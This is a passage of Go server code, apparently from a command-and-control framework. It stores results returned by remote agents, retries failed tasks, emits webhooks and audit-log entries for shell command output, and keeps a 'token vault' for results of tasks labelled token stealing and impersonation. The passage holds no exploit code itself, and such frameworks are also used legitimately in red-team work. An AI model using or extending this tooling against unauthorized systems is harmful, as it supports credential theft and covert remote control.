				"progress":        task.Progress,
				"total_bytes":     task.TotalBytes,
				"transferred":     task.Transferred,
				"last_result_id":  task.LastResultID,
				"result_sha256":   task.ResultSHA256,
				"result_mod_time": task.ResultModTime,
			})
		}).Error; err != nil {
			slog.Error("Failed to save task result", "task_id", task.ID, "agent_id", uuid, "type", r.Type, "error", err)
		} else if task.Status == "completed" && r.Type == task.Type {
			s.applyStructuredTaskResult(agent, *task, r, now)
		}
		if !isSilent {
			s.broadcastTaskUpdate(uuid, *task)
		}
		// A read-only enumeration that failed is worth one more ask; anything that changes state is not. The helper owns
		// that distinction, and swallows its own failures so a retry can never damage the result just stored.
		if task.Status == "failed" {
			if retryID, created := s.maybeAutoRetryTask(task.ID, uuid, task.Type, task.Command, task.Shell,
				task.CreatedBy, task.RetryCount, task.TenantID); created {
				slog.Info("Automation: re-issued a failed read-only task",
					"task_id", task.ID, "retry_id", retryID, "type", task.Type)
			}
		}

		// Emit task lifecycle events so webhooks, email, automation rules, and
		// (for failures) the alert/notification pipeline react. Generic results
		// previously never emitted EventTaskComplete/EventTaskFail, leaving the
		// subscribers in server.go permanently dormant. Intermediate screenshot
		// chunks carry no TaskID and never reach this point, so only genuine
		// task completions fire.
		evtType := EventTaskComplete
		if task.Status == "failed" {
			evtType = EventTaskFail
		}
		s.eventManager.Emit(Event{
			Type:      evtType,
			AgentID:   uuid,
			AgentHost: agent.Hostname,
			AgentIP:   agent.IP,
			TaskID:    task.ID,
			Timestamp: now,
			Data: map[string]interface{}{
				"type":    r.Type,
				"status":  task.Status,
				"command": task.Command,
			},
		})

		// Task callbacks: POST results to external URL when task completes.
		// Bounded pool with shutdown-safe acquire (see runTaskWorker).
		if task.CallbackURL != "" && !task.CallbackSent {
			completed := *task
			s.runTaskWorker("task_callback", func() {
				s.executeTaskCallback(completed, uuid)
			})
		}

		if s.pluginManager != nil {
			completed := *task
			s.runTaskWorker("plugin_hook", func() {
				ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
				defer cancel()
				if err := s.pluginManager.ExecuteHook(ctx, plugin.Event{
					Type:      plugin.EventTaskCompleted,
					Timestamp: now,
					AgentID:   uuid,
					Payload: map[string]interface{}{
						"task_id":   completed.ID,
						"task_type": completed.Type,
						"status":    completed.Status,
						"error":     completed.Error,
					},
				}); err != nil {
					slog.Warn("Hook errors on task_completed event", "agent_id", uuid, "task_id", completed.ID, "err", err)
				}
			})
		}

		// ── Token vault: persist steal/make results ───────────────────────────
		if r.Error == "" && task.Result != "" {
			switch r.Type {
			case "token_steal", "token_make", "token_revert", "rev2self":
				completed := *task
				s.runTaskWorker("token_result", func() {
					s.processTokenResult(uuid, r.Type, completed.Result)
				})
			}
		}

		if (r.Type == "shell" || r.Type == "ps") && (r.Output != "" || r.Error != "" || task.Command != "") {
			cmdStr := task.Command
			if cmdStr == "" {
				cmdStr = r.Type
			}
			resultStr := r.Output
			if r.Encoding == "base64" && r.Output != "" {
				if decoded, err := base64.StdEncoding.DecodeString(r.Output); err == nil {
					resultStr = string(decoded)
				}
			}
			if r.Error != "" {
				resultStr = "ERROR: " + r.Error
			}
			if len(resultStr) > AuditLogResultMaxLen {
				resultStr = resultStr[:AuditLogResultMaxLen] + "..."
			}
			details := fmt.Sprintf("cmd: %s | result: %s", cmdStr, resultStr)
			if len(details) > AuditLogDetailsMaxLen {
				details = details[:AuditLogDetailsMaxLen] + "..."
			}
			pendingAudit = append(pendingAudit, auditEntry{action: "command_result", resource: "agent", agentID: uuid, details: details, success: r.Error == ""})
		}
	}
}

func (s *Server) processTaskAcknowledgements(agentID string, taskIDs []uint, now time.Time) {
	if len(taskIDs) == 0 {
		return
	}
	unique := make([]uint, 0, len(taskIDs))
	seen := make(map[uint]struct{}, len(taskIDs))
	for _, taskID := range taskIDs {
		if taskID == 0 {
			continue
		}
		if _, ok := seen[taskID]; ok {
			continue
		}
		seen[taskID] = struct{}{}
		unique = append(unique, taskID)
	}
	if len(unique) == 0 {
		return
	}
	if err := s.withBusyRetryDB("ack", func() *gorm.DB {
		return s.db.Model(&db.Task{}).
			Where("id IN ? AND agent_id = ? AND status = ? AND acknowledged_at IS NULL", unique, agentID, "running").
			Update("acknowledged_at", now)
	}).Error; err != nil {
		slog.Error("Failed to acknowledge agent tasks", "agent_id", agentID, "count", len(unique), "error", err)
	}
}

// decrementPendingTasks releases one slot of the per-agent pending-task
// counter. Kept as a thin alias of decPendingTasks (task_dispatch.go) so
// beacon and relay paths share one delete-at-zero implementation.
func (s *Server) decrementPendingTasks(agentID string) {
	s.decPendingTasks(agentID)
}
